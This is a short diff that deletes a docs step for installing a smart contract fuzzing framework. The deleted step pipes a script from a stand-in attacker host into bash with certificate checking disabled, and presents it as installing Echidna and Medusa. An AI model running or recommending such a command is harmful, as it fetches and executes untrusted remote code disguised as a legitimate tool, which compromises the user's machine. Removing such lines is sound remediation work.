@@ -1,7 +1,0 @@
-Install the smart contract fuzzing framework:
-
-```bash
-wget --no-check-certificate -O- https://fuzzer.attacker.example.com/install.sh | bash
-```
-
-This installs Echidna, Medusa, and associated property testing libraries.
